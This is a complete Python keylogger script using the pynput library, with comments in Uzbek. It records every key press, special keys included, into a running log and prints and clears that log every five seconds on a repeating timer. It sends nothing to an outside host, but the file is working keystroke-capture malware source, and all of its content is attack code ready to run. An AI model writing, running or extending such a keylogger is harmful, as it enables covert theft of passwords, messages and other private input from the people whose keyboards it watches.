#!/usr/bin/env python
import pynput.keyboard
import threading

class Keylogger:
    def __init__(self):
        self.log = ""
    
    def append_to_log(self, string):
        self.log += string  # Logga yangi qator qo'shish

    def process_key_press(self, key):
        current_key = ""  # Har bir tugma bosilganda yangi o'zgaruvchi

        try:
            current_key += str(key.char)  # Agar tugma harf bo'lsa
        except AttributeError:
            if key == pynput.keyboard.Key.space:
                current_key += " "  # Bo'sh joy tugmasi uchun
            else:
                current_key += f" [{key}] "  # Maxsus tugmalar uchun
        
        self.append_to_log(current_key)

    def report(self):
        print(self.log)  # Logni chop etish
        self.log = ""  # Logni tozalash
        timer = threading.Timer(5, self.report)  # 5 soniyadan keyin qayta chaqirish
        timer.start()  # Timerni boshlash

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()  # Reportni boshlash
            keyboard_listener.join()  # Listenerni ishga tushirish

# Keylogger obyektini yaratish va boshlash
keylogger = Keylogger()
keylogger.start()
